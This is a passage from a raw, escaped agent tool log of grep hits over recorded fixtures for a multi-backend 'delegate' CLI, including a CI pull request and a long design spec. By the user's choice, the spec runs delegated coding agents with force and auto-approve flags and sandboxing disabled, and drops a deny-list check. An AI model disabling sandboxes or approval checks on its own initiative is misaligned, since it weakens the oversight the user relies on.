Scope\\n\\n- A separate Codex backend; Codex models are reached through pi's openai-codex provider.\\n- Fiber as a backend (waits for `fiber ask`).\\n- Sandboxing any backend, or a seatbelt wrapper for pi.\\n- Read-only mode for pi.\\n- Server-created worktrees; callers create their own and pass `--cwd`.\\n- Cleanup of old status records.\\n- Reading pi's model catalog at runtime for prices.\\n- Tiered (long-context) pricing in the model table.\\n- Keeping MCP as a second interface.\\n\\n## Further Notes\\n\\n- Usage numbers come from 413 deduplicated `cursor_run` calls in local Claude transcripts.\\n- Headless Claude auto mode cannot prompt, so calls its classifier will not auto-approve are refused. If that proves frequent, revisit.\\n- If headless plan mode misbehaves, fall back to blocking the edit tools for read-only Claude runs.\\n- A delegated Claude or pi loads this skill and the user's global instructions, so briefs must say \\\"do not delegate further\\\" to stop loops.\\n- Superseded design notes: the multi-backend idea doc, which this spec replaces.\",\"stderr\":\"\",\"interrupted\":false,\"isImage\":false,\"noOutputExpected\":false}}\ntests/fixtures/claude/review-18.stdout:29:{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"type\":\"tool_result\",\"content\":\"Exit code 1\\n21:The tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n60:28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n73:41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n79:47. As a user, I want my existing host profile moved to the new config location by setup, so that my settings survive the rename.\\n98:delegate run    --model M [--capability read-only|read-write] [--cwd D] [--gate CMD] [--tool-idle-ms N] [--prompt-file F | stdin]\\n99:delegate resume <jobId> [--model M] [--capability C] [--gate CMD] [--prompt-file F | stdin]\\n106:Removed with no replacement: `cursor_poll`, `cursor_wait`, `cursor_wait_any`, `cursor_wait_all`, `cursor_answer`; parameters `waitMs`, `background`, `session`, `isolation`, `verifyCommands`, `allowPartialCommit`, `idleMs`, `requireNonClaude`, `allowUnsandboxed`; capabilities `plan` and `write-unsandboxed`; host-profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs`; the deny-list check; BackendProvided worktrees; MCP progress notifications; the `family` model field; the doctor plugin-registration and legacy-name checks.\\n122:- **cursor**: `cursor-agent --print --output-format stream-json --trust --approve-mcps --force`. read-only is ask mode; read-write is `--sandbox disabled`. Resume by the session id from the result line. Cost from the model table.\\n123:- **pi**: `pi -p --mode json --model provider/id`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume reuses it. read-only is rejected. Cost is pi's own reported cost.\\n124:- **claude**: `claude -p --output-format stream-json --verbose --model ...`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume with `--resume`. read-only is `--permission-mode plan`; read-write is `--permission-mode auto`. Cost is the result line's `total_cost_usd`. The stream closely matches cursor's, so the parser should share most of cursor's.\\n130:**Doctor.** Plugin/binary version; per backend: binary found, version, login (cursor `about`, pi `auth check`, claude equivalent); per model: available on its backend (cursor `--list-models`, pi `auth check --model`). Missing models are warnings.\\n153:- Sandboxing any backend, or a seatbelt wrapper for pi.\\ncursor/lane-8-ci-repair.stdout\\ncursor/ponytail-19.stdout\\ncursor/lane-8-ci-repair.argv\\ncursor/preflight-7.stdout\\ncursor/preflight-7.argv\\ncursor/ponytail-19.argv\\ncursor/ponytail-18.argv\\ncursor/lane-8-ci.stdout\\ncursor/ponytail-18.stdout\\nclaude/review-19.stdout\\n  35 /Users/user\\n 186 /Users/user\\nclaude/review-18.stdout\\n1.7M\\t.\\n  431970 cursor/ponytail-18.stdout\\n  175819 cursor/preflight-7.stdout\\n  174974 pi/cancelled.stdout\\n  782763 total\",\"is_error\":true,\"tool_use_id\":\"toolu_019cExtXuYqSGwSxpUdYaKTt\"}]},\"parent_tool_use_id\":null,\"session_id\":\"3dfd18ba-a3ed-4a44-bd90-c4ca03e8efdd\",\"uuid\":\"797cfe15-0894-4fe8-8311-9be1f92b1294\",\"timestamp\":\"2026-10-01T08:27:17.686Z\",\"tool_use_result\":\"Error: Exit code 1\\n21:The tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n60:28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n73:41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n79:47. As a user, I want my existing host profile moved to the new config location by setup, so that my settings survive the rename.\\n98:delegate run    --model M [--capability read-only|read-write] [--cwd D] [--gate CMD] [--tool-idle-ms N] [--prompt-file F | stdin]\\n99:delegate resume <jobId> [--model M] [--capability C] [--gate CMD] [--prompt-file F | stdin]\\n106:Removed with no replacement: `cursor_poll`, `cursor_wait`, `cursor_wait_any`, `cursor_wait_all`, `cursor_answer`; parameters `waitMs`, `background`, `session`, `isolation`, `verifyCommands`, `allowPartialCommit`, `idleMs`, `requireNonClaude`, `allowUnsandboxed`; capabilities `plan` and `write-unsandboxed`; host-profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs`; the deny-list check; BackendProvided worktrees; MCP progress notifications; the `family` model field; the doctor plugin-registration and legacy-name checks.\\n122:- **cursor**: `cursor-agent --print --output-format stream-json --trust --approve-mcps --force`. read-only is ask mode; read-write is `--sandbox disabled`. Resume by the session id from the result line. Cost from the model table.\\n123:- **pi**: `pi -p --mode json --model provider/id`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume reuses it. read-only is rejected. Cost is pi's own reported cost.\\n124:- **claude**: `claude -p --output-format stream-json --verbose --model ...`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume with `--resume`. read-only is `--permission-mode plan`; read-write is `--permission-mode auto`. Cost is the result line's `total_cost_usd`. The stream closely matches cursor's, so the parser should share most of cursor's.\\n130:**Doctor.** Plugin/binary version; per backend: binary found, version, login (cursor `about`, pi `auth check`, claude equivalent); per model: available on its backend (cursor `--list-models`, pi `auth check --model`). Missing models are warnings.\\n153:- Sandboxing any backend, or a seatbelt wrapper for pi.\\ncursor/lane-8-ci-repair.stdout\\ncursor/ponytail-19.stdout\\ncursor/lane-8-ci-repair.argv\\ncursor/preflight-7.stdout\\ncursor/preflight-7.argv\\ncursor/ponytail-19.argv\\ncursor/ponytail-18.argv\\ncursor/lane-8-ci.stdout\\ncursor/ponytail-18.stdout\\nclaude/review-19.stdout\\n  35 /Users/user\\n 186 /Users/user\\nclaude/review-18.stdout\\n1.7M\\t.\\n  431970 cursor/ponytail-18.stdout\\n  175819 cursor/preflight-7.stdout\\n  174974 pi/cancelled.stdout\\n  782763 total\"}\n===\n\n[Showing lines 17-19 of 19 (50.0KB limit). Full output: /var/folders/dq/_c83wftd34g281_1002c_gl00000gn/T/pi-bash-cbe556a16a5261d3.log]"}],"details":{"truncation":{"content":"tests/fixtures/claude/review-19.stdout:16:{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"tool_use_id\":\"toolu_01CtvwRn678gy36PGvnifeBK\",\"type\":\"tool_result\",\"content\":\"title:\\tci: Linux workflow (fmt, clippy, tests) (#8)\\nstate:\\tDRAFT\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\t\\nassignees:\\t\\nreviewers:\\t\\nprojects:\\t\\nmilestone:\\t\\nnumber:\\t19\\nurl:\\thttps://github.com/user/delegate/pull/19\\nadditions:\\t23\\ndeletions:\\t0\\nauto-merge:\\tdisabled\\n--\\nFixes #8\\n\\nOne `ci` job on `ubuntu-latest` for pull requests and pushes to `main`: `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test`. Ignored live tests stay excluded. Every action is pinned by SHA, the token is read-only, and `pull_request_target` is not used.\\n\\nImplemented by composer-2.5 via `scripts/record.sh` (fixture lands with #18).\\n\\nCo-authored with Claude Code.\\ndiff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\\nnew file mode 100644\\nindex 0000000..ede11d5\\n--- /dev/null\\n+++ b/.github/workflows/ci.yml\\n@@ -0,0 +1,23 @@\\n+name: CI\\n+\\n+on:\\n+  push:\\n+    branches: [main]\\n+  pull_request:\\n+\\n+permissions:\\n+  contents: read\\n+\\n+jobs:\\n+  ci:\\n+    runs-on: ubuntu-latest\\n+    steps:\\n+      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\\n+      - uses: dtolnay/rust-toolchain@6bed0761d98439e5a578e2877258200ad565ba87 # stable\\n+        with:\\n+          toolchain: stable\\n+          components: rustfmt, clippy\\n+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2\\n+      - run: cargo fmt --check\\n+      - run: cargo clippy --all-targets -- -D warnings\\n+      - run: cargo test\\ntitle:\\tCI on Linux\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t0\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\tuser/delegate#6\\nblocking:\\t\\nnumber:\\t8\\n--\\n## Parent\\n\\n#4\\n\\n## What to build\\n\\nGitHub Actions CI on Linux (`ubuntu-latest`) running the format check, clippy with warnings as errors, and the test suite, on every push and pull request. Live tests stay excluded. macOS is tested locally.\\n\\nDrive this ticket's implementation through the recording script, saving the run as a fixture.\\n\\n## Acceptance criteria\\n\\n- [ ] The workflow runs on pull requests and on pushes to main.\\n- [ ] It passes on the current code, or the Linux-only failures it surfaces are fixed.\\n- [ ] Ignored live tests are not run.\\n\\n## Blocked by\\n\\n- #6 Record headless fixtures (recording script and probes)\\ntitle:\\tSpec: delegate, a multi-backend CLI replacing the cursor-delegate MCP server\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t1\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\t\\nblocking:\\t\\nnumber:\\t4\\n--\\n## Problem Statement\\n\\ncursor-delegate lets a host agent hand work to Cursor's models, but only Cursor's, and only from hosts that load its MCP server. The models I actually use are spread across three harnesses: Cursor (Composer, Grok), pi (ChatGPT-subscription GPT models, opencode-go models) and Claude Code (Claude on the Max plan). None of them can reach the others' models.\\n\\nThe tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n\\nRunning as an MCP server adds its own costs: one resident process per host session, job state that dies with the session, a write lock that cannot see writes from another session, and per-harness registration (Claude plugin, Codex plugin manifest).\\n\\n## Solution\\n\\nReplace the `cursor-delegate` MCP server with a CLI called `delegate`, plus one skill. Any harness with a shell can call it. Every configured model is reachable from every harness, routed to one of three backends: cursor-agent, pi, or Claude Code.\\n\\n`delegate run` starts a job and returns its id immediately. Each job runs under its own detached supervisor that writes a per-job status file. Callers wait with `delegate watch` run in the background and read results from the status file. A finished job can be continued with `delegate resume`. The run surface shrinks to the parameters that real use needs.\\n\\n## User Stories\\n\\n1. As an orchestrating agent, I want to start a delegated job with one shell command, so that I can delegate from any harness that has a shell.\\n2. As an orchestrating agent, I want `delegate run` to print the job id and return at once, so that my turn is never blocked on a model.\\n3. As an orchestrating agent, I want to pass the prompt on stdin or from a file, so that long briefs need no shell quoting.\\n4. As an orchestrating agent, I want to choose a model by id, so that the backend follows from the model without a separate flag.\\n5. As an orchestrating agent, I want a default model when I omit one, so that cheap bulk work needs no extra flag.\\n6. As an orchestrating agent, I want an unknown model id rejected with the list of valid ids, so that a typo fails fast.\\n7. As an orchestrating agent, I want `read-only` and `read-write` capabilities, so that I can say whether a delegate may change files.\\n8. As an orchestrating agent, I want `read-only` to be the default, so that a forgotten flag never grants writes.\\n9. As an orchestrating agent, I want a pi model with `read-only` rejected, so that I never believe a pi run is read-only when pi cannot enforce it.\\n10. As an orchestrating agent, I want to set the delegate's working directory, so that it works in a worktree or scratch directory I prepared.\\n11. As an orchestrating agent, I want the working directory to default to where I ran the command, so that the common case needs no flag.\\n12. As an orchestrating agent, I want a second read-write job in the same directory refused with BUSY, so that two delegates never interleave edits.\\n13. As an orchestrating agent, I want that lock to hold across separate host sessions, so that two Claude sessions cannot collide in one tree.\\n14. As an orchestrating agent, I want to give a gate command the tool runs after the agent, so that I get ground-truth verification instead of the delegate's claim.\\n15. As an orchestrating agent, I want a failing gate to downgrade DONE to DONE_WITH_CONCERNS with the gate's output, so that I see what failed.\\n16. As an orchestrating agent, I want the result to include the git change-set the tool computed, so that I know what actually changed.\\n17. As an orchestrating agent, I want a concern when commits landed but the tree is still dirty, so that half-committed work is visible.\\n18. As an orchestrating agent, I want to widen the tool-call idle window for one job, so that a long build or benchmark is not killed as hung.\\n19. As an orchestrating agent, I want a job that goes silent past its idle window killed and reported, so that hung jobs end on their own.\\n20. As an orchestrating agent, I want to wait on one or many jobs with `delegate watch` in a background shell, so that my turn can end and I get one notification when they finish.\\n21. As an orchestrating agent, I want `delegate watch` to print every job's final record, so that one command both waits and delivers results.\\n22. As an orchestrating agent, I want `delegate watch` to stop at a timeout, so that a missing or never-written record cannot hang it forever.\\n23. As an orchestrating agent, I want to read a job's progress by reading its status file, so that polling needs no tool.\\n24. As an orchestrating agent, I want the status file to carry a heartbeat while running, so that I can tell a dead supervisor from a slow job.\\n25. As an orchestrating agent, I want the final status file to hold the full result (status, text, usage, cost, change-set, gate result, session), so that the file is the whole answer.\\n26. As an orchestrating agent, I want the delegate's final STATUS line to set the result status, including NEEDS_CONTEXT, so that I know when it needs me.\\n27. As an orchestrating agent, I want to resume any finished job with a follow-up prompt, so that I can answer a question or ask for fixes without re-briefing.\\n28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n29. As an orchestrating agent, I want to override capability, gate or model on resume, so that a read-only reviewer can go on to fix what it found.\\n30. As an orchestrating agent, I want a model override that crosses backends rejected, so that I never try to resume a cursor session in pi.\\n31. As an orchestrating agent, I want resume to work after the host session or machine sleep, until reboot, so that follow-ups do not depend on a live server.\\n32. As an orchestrating agent, I want resume to return a new job id, so that each run has its own record.\\n33. As an orchestrating agent, I want to cancel a job by id, so that I can stop a runaway delegate and the commands it started.\\n34. As an orchestrating agent, I want `delegate models` to list ids, labels, backends and prices, so that I can pick a model without reading config.\\n35. As a user, I want to see per-run cost, so that I know what delegation would cost at list prices.\\n36. As a user, I want cursor runs priced from the model table and pi and claude runs to report their own cost, so that no backend's pricing is reimplemented.\\n37. As a user, I want prices for every model in the model table, so that `delegate models` shows them all.\\n38. As a user, I want `delegate doctor` to check each backend's binary, version and login, so that setup problems show before a run fails.\\n39. As a user, I want doctor to check each configured model is available on its backend, so that renamed or retired models (Grok 4.6 to 4.7) show as warnings.\\n40. As a user, I want pi and Claude Code to run with my full configuration (extensions, plugins, skills, context files), so that delegates behave as they do when I run them.\\n41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n42. As a user, I want Claude Code read-write runs in auto permission mode, so that its classifier still screens tool calls.\\n43. As a user, I want Claude Code read-only runs in plan permission mode, so that they cannot edit.\\n44. As a user, I want the model list trimmed to models I use, so that the menu is short.\\n45. As a user, I want Composer 2.5, Grok 4.7 high and xhigh from cursor; muse-spark-1.3-contributor, glm-5.3-flash, deepseek-v4.1-flash from opencode-go via pi; gpt-6-astra, gpt-6-luna, gpt-6.1-sol from openai-codex via pi; and Claude Opus 5.5, Sonnet 5.5, Fable 5.1 via Claude Code.\\n46. As a user, I want the project renamed from cursor-delegate to delegate everywhere (binary, config directory, environment variable, status-file directory, skill, repo), so that the name matches what it does.\\n47. As a user, I want my existing host profile moved to the new config location by setup, so that my settings survive the rename.\\n48. As a user, I want setup to build the binary and put `delegate` on my PATH, so that every harness can call it.\\n49. As a user, I want the skill to show briefs that say \\\"do not delegate further\\\", so that a delegated Claude does not loop back through delegate.\\n50. As a user, I want my global instructions to allow local Opus 5.5 and Sonnet 5.5 subagents and route other delegation through `delegate`, so that the Max plan is used where it fits.\\n51. As a user, I want the skill to make the background watcher the waiting path, so that agents stop holding turns open.\\n52. As a user, I want the skill rewritten for the new surface (catalog, model picks, resume, gates, watcher), so that it stays the single source of usage guidance.\\n53. As a maintainer, I want each backend to own its argument building, capability mapping, output parsing, resume method and doctor checks, so that adding a harness touches one place.\\n54. As a maintainer, I want parsers tested against output recorded from real headless runs, so that a CLI upgrade that changes its stream breaks a test.\\n55. As a maintainer, I want opt-in live tests per backend that also record fresh fixtures, so that fixtures stay current.\\n56. As a maintainer, I want latency budgets on every command, so that performance regressions fail tests.\\n57. As a maintainer, I want a memory budget on the per-job supervisor, so that a job's footprint stays small.\\n58. As a maintainer, I want CI on Linux running format, lint and tests, so that breakage on my other platform is caught; macOS runs locally.\\n59. As a maintainer, I want dead docs (old reproduction spec, July/August plans and specs, code review notes) and the parity snapshot removed, so that the repo describes only what exists.\\n\\n## Implementation Decisions\\n\\n**Surface.** The MCP server is removed. The CLI is:\\n\\n```\\ndelegate run    --model M [--capability read-only|read-write] [--cwd D] [--gate CMD] [--tool-idle-ms N] [--prompt-file F | stdin]\\ndelegate resume <jobId> [--model M] [--capability C] [--gate CMD] [--prompt-file F | stdin]\\ndelegate cancel <jobId>\\ndelegate watch  <jobId>... [--timeout S]\\ndelegate doctor\\ndelegate models\\n```\\n\\nRemoved with no replacement: `cursor_poll`, `cursor_wait`, `cursor_wait_any`, `cursor_wait_all`, `cursor_answer`; parameters `waitMs`, `background`, `session`, `isolation`, `verifyCommands`, `allowPartialCommit`, `idleMs`, `requireNonClaude`, `allowUnsandboxed`; capabilities `plan` and `write-unsandboxed`; host-profile fields `promptPreamble`, `verifyCommands`, `requiredDeny`, `deadlineMs`; the deny-list check; BackendProvided worktrees; MCP progress notifications; the `family` model field; the doctor plugin-registration and legacy-name checks.\\n\\n**Job model.** `run` validates input, writes the initial status record, spawns a detached supervisor (own session and process group, stdio redirected), prints the job id and exits. The supervisor runs the backend child, the idle watchdog, the gate and the git change-set, and writes the status record at start, on a heartbeat while running, and at the terminal transition. The status record is the source of truth for every command after `run`; there is no in-memory registry.\\n\\n**Status record.** One JSON file per job in `$TMPDIR/delegate-jobs/`. While running: status, heartbeat timestamp, progress snapshot, supervisor pid. When terminal: status and the full result. It also stores what resume needs: backend session id, model, cwd, capability, gate, tool-idle window. Records live until reboot and are not cleaned up.\\n\\n**Write lock.** A lock file per resolved `cwd`, held by the supervisor of a read-write job. A second read-write `run` or `resume` in the same `cwd` returns BUSY with the holder's job id. Works across host sessions.\\n\\n**Resume.** Reads the job's status record, applies overrides, rejects a model override on a different backend, and starts a new job continuing the backend session. Works on any terminal status.\\n\\n**Cancel.** Reads the supervisor pid from the record and signals its process group; the record ends CANCELLED.\\n\\n**Watch.** Blocks until every named record is terminal or the timeout passes, then prints each record. No external dependencies.\\n\\n**Backends.** Selected by a `backend` field on each model in the model table. Each backend provides: binary resolution, argument building from (model, capability, cwd, session), a stream parser that yields the existing progress snapshot and a normalized result (text, session id, usage, optional reported cost, error), a resume method, and doctor checks.\\n\\n- **cursor**: `cursor-agent --print --output-format stream-json --trust --approve-mcps --force`. read-only is ask mode; read-write is `--sandbox disabled`. Resume by the session id from the result line. Cost from the model table.\\n- **pi**: `pi -p --mode json --model provider/id`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume reuses it. read-only is rejected. Cost is pi's own reported cost.\\n- **claude**: `claude -p --output-format stream-json --verbose --model ...`, full user configuration loaded. Session id chosen before launch with `--session-id`; resume with `--resume`. read-only is `--permission-mode plan`; read-write is `--permission-mode auto`. Cost is the result line's `total_cost_usd`. The stream closely matches cursor's, so the parser should share most of cursor's.\\n\\n**Model table.** Bundled JSON: `default` plus, per id, `{label, backend, price}`. Prices are kept for every model for display; only cursor uses them to compute cost. Pi model ids use pi's `provider/model` form. Default is `composer-2.5`. Grok 4.7 ids are `grok-4.7-high` / `grok-4.7-xhigh` (no `cursor-` prefix), priced as Grok 4.6.\\n\\n**Prompt composition.** The tool adds only the STATUS-line instruction to the caller's prompt; the result status is parsed from that line.\\n\\n**Doctor.** Plugin/binary version; per backend: binary found, version, login (cursor `about`, pi `auth check`, claude equivalent); per model: available on its backend (cursor `--list-models`, pi `auth check --model`). Missing models are warnings.\\n\\n**Rename.** Binary `delegate`; config at `~/.config/delegate/` with `DELEGATE_HOST_PROFILE` override; setup moves the old profile file. The Claude plugin ships the skill only. The Codex plugin manifest is dropped since nothing needs registering. The GitHub repo and local directory were renamed on 2026-10-01. The user's global agent instructions and agent memory are updated to the new names.\\n\\n**Skill.** Rewritten for the CLI: model picks and catalog over the new ids, read-only/read-write, cwd, gates, resume with overrides, the background `delegate watch` as the only documented waiting path, and a \\\"do not delegate further\\\" line for briefs. The plan-writer brief points at resume.\\n\\n**Delivery order.** (1) CLI conversion with all trims and the rename, cursor only, plus CI; (2) backend split behind the interface; (3) pi backend; (4) claude backend.\\n\\n## Testing Decisions\\n\\nA good test drives the `delegate` binary as a real process and asserts on what a caller sees: command output, exit status, and status-file contents. It does not reach into internal modules.\\n\\n- **Primary seam: the CLI against fake agent binaries.** Extends the existing end-to-end tests, which already run the real binary with a shell-script fake cursor-agent selected by an environment variable. Each backend gets a fake that replays a recorded stream. Covers run/detach, BUSY across processes, watchdog kill, gate pass/fail, change-set, NEEDS_CONTEXT, resume with and without overrides, cross-backend override rejection, resume after the original process is gone, cancel killing the process group, watch timeout, doctor, models.\\n- **Parser seam: one per backend, on recorded headless output.** Prior art: the cursor adapter's stream tests. Fixtures are raw stdout captured from real headless runs, not stored session files (pi session files, Claude transcripts and Cursor chat stores are different formats). Use past sessions to choose realistic tasks to record: long tool output, many tool calls, resume, errors.\\n- **Live tests, opt-in.** One real round trip per backend, ignored by default, like the existing live test. They save raw stdout as fresh fixtures. They also settle two open behaviours: whether headless plan mode in Claude answers rather than proposing a plan, and how often auto mode refuses calls.\\n- **Latency budgets.** Every command is timed against fake agents. `run` returning its job id matters most. Budgets are set at about 3x the local measurement so CI noise does not trip them.\\n- **Memory budget.** The supervisor's resident memory is measured while a fake agent runs. Replaces the old idle-server memory gate.\\n- **CI.** GitHub Actions on Linux: format check, clippy with warnings as errors, tests. Live tests excluded. macOS runs locally. The suite currently takes about 5 seconds warm, 5 seconds clean build.\\n\\n## Out of Scope\\n\\n- A separate Codex backend; Codex models are reached through pi's openai-codex provider.\\n- Fiber as a backend (waits for `fiber ask`).\\n- Sandboxing any backend, or a seatbelt wrapper for pi.\\n- Read-only mode for pi.\\n- Server-created worktrees; callers create their own and pass `--cwd`.\\n- Cleanup of old status records.\\n- Reading pi's model catalog at runtime for prices.\\n- Tiered (long-context) pricing in the model table.\\n- Keeping MCP as a second interface.\\n\\n## Further Notes\\n\\n- Usage numbers come from 413 deduplicated `cursor_run` calls in local Claude transcripts.\\n- Headless Claude auto mode cannot prompt, so calls its classifier will not auto-approve are refused. If that proves frequent, revisit.\\n- If headless plan mode misbehaves, fall back to blocking the edit tools for read-only Claude runs.\\n- A delegated Claude or pi loads this skill and the user's global instructions, so briefs must say \\\"do not delegate further\\\" to stop loops.\\n- Superseded design notes: the multi-backend idea doc, which this spec replaces.\",\"is_error\":false}]},\"parent_tool_use_id\":null,\"session_id\":\"26c5e6c8-864e-4d87-8aa1-c1ca5a12b9c9\",\"uuid\":\"4d456178-f0db-42af-a381-5b967990b31d\",\"timestamp\":\"2026-10-01T08:23:07.923Z\",\"tool_use_result\":{\"stdout\":\"title:\\tci: Linux workflow (fmt, clippy, tests) (#8)\\nstate:\\tDRAFT\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\t\\nassignees:\\t\\nreviewers:\\t\\nprojects:\\t\\nmilestone:\\t\\nnumber:\\t19\\nurl:\\thttps://github.com/user/delegate/pull/19\\nadditions:\\t23\\ndeletions:\\t0\\nauto-merge:\\tdisabled\\n--\\nFixes #8\\n\\nOne `ci` job on `ubuntu-latest` for pull requests and pushes to `main`: `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test`. Ignored live tests stay excluded. Every action is pinned by SHA, the token is read-only, and `pull_request_target` is not used.\\n\\nImplemented by composer-2.5 via `scripts/record.sh` (fixture lands with #18).\\n\\nCo-authored with Claude Code.\\ndiff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\\nnew file mode 100644\\nindex 0000000..ede11d5\\n--- /dev/null\\n+++ b/.github/workflows/ci.yml\\n@@ -0,0 +1,23 @@\\n+name: CI\\n+\\n+on:\\n+  push:\\n+    branches: [main]\\n+  pull_request:\\n+\\n+permissions:\\n+  contents: read\\n+\\n+jobs:\\n+  ci:\\n+    runs-on: ubuntu-latest\\n+    steps:\\n+      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\\n+      - uses: dtolnay/rust-toolchain@6bed0761d98439e5a578e2877258200ad565ba87 # stable\\n+        with:\\n+          toolchain: stable\\n+          components: rustfmt, clippy\\n+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2\\n+      - run: cargo fmt --check\\n+      - run: cargo clippy --all-targets -- -D warnings\\n+      - run: cargo test\\ntitle:\\tCI on Linux\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t0\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\tuser/delegate#6\\nblocking:\\t\\nnumber:\\t8\\n--\\n## Parent\\n\\n#4\\n\\n## What to build\\n\\nGitHub Actions CI on Linux (`ubuntu-latest`) running the format check, clippy with warnings as errors, and the test suite, on every push and pull request. Live tests stay excluded. macOS is tested locally.\\n\\nDrive this ticket's implementation through the recording script, saving the run as a fixture.\\n\\n## Acceptance criteria\\n\\n- [ ] The workflow runs on pull requests and on pushes to main.\\n- [ ] It passes on the current code, or the Linux-only failures it surfaces are fixed.\\n- [ ] Ignored live tests are not run.\\n\\n## Blocked by\\n\\n- #6 Record headless fixtures (recording script and probes)\\ntitle:\\tSpec: delegate, a multi-backend CLI replacing the cursor-delegate MCP server\\nstate:\\tOPEN\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\tready-for-agent\\ncomments:\\t1\\nassignees:\\t\\nprojects:\\t\\nmilestone:\\t\\nissue-type:\\t\\nparent:\\t\\nsub-issues:\\t\\nsub-issues-completed:\\t\\nblocked-by:\\t\\nblocking:\\t\\nnumber:\\t4\\n--\\n## Problem Statement\\n\\ncursor-delegate lets a host agent hand work to Cursor's models, but only Cursor's, and only from hosts that load its MCP server. The models I actually use are spread across three harnesses: Cursor (Composer, Grok), pi (ChatGPT-subscription GPT models, opencode-go models) and Claude Code (Claude on the Max plan). None of them can reach the others' models.\\n\\nThe tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n\\nRunning as an MCP server adds its own costs: one resident process per host session, job state that dies with the session, a write lock that cannot see writes from another session, and per-harness registration (Claude plugin, Codex plugin manifest).\\n\\n## Solution\\n\\nReplace the `cursor-delegate` MCP server with a CLI called `delegate`, plus one skill. Any harness with a shell can call it. Every configured model is reachable from every harness, routed to one of three backends: cursor-agent, pi, or Claude Code.\\n\\n`delegate run` starts a job and returns its id immediately. Each job runs under its own detached supervisor that writes a per-job status file. Callers wait with `delegate watch` run in the background and read results from the status file. A finished job can be continued with `delegate resume`. The run surface shrinks to the parameters that real use needs.\\n\\n## User Stories\\n\\n1. As an orchestrating agent, I want to start a delegated job with one shell command, so that I can delegate from any harness that has a shell.\\n2. As an orchestrating agent, I want `delegate run` to print the job id and return at once, so that my turn is never blocked on a model.\\n3. As an orchestrating agent, I want to pass the prompt on stdin or from a file, so that long briefs need no shell quoting.\\n4. As an orchestrating agent, I want to choose a model by id, so that the backend follows from the model without a separate flag.\\n5. As an orchestrating agent, I want a default model when I omit one, so that cheap bulk work needs no extra flag.\\n6. As an orchestrating agent, I want an unknown model id rejected with the list of valid ids, so that a typo fails fast.\\n7. As an orchestrating agent, I want `read-only` and `read-write` capabilities, so that I can say whether a delegate may change files.\\n8. As an orchestrating agent, I want `read-only` to be the default, so that a forgotten flag never grants writes.\\n9. As an orchestrating agent, I want a pi model with `read-only` rejected, so that I never believe a pi run is read-only when pi cannot enforce it.\\n10. As an orchestrating agent, I want to set the delegate's working directory, so that it works in a worktree or scratch directory I prepared.\\n11. As an orchestrating agent, I want the working directory to default to where I ran the command, so that the common case needs no flag.\\n12. As an orchestrating 